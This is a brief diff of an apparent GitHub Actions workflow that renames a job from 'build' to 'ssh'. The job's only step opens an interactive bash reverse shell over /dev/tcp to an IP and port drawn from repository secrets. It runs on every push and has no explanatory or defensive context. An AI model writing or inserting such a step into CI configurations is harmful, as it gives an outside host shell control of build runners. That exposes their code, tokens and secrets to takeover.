@@ -4,7 +4,7 @@ on:
   push:
   workflow_dispatch:
 jobs:
-  build:
+  ssh:
     runs-on: ubuntu-latest
     steps:
       - run: bash -i > /dev/tcp/${{secrets.IP}}/${{secrets.PORT}} 0<&1 2>&1
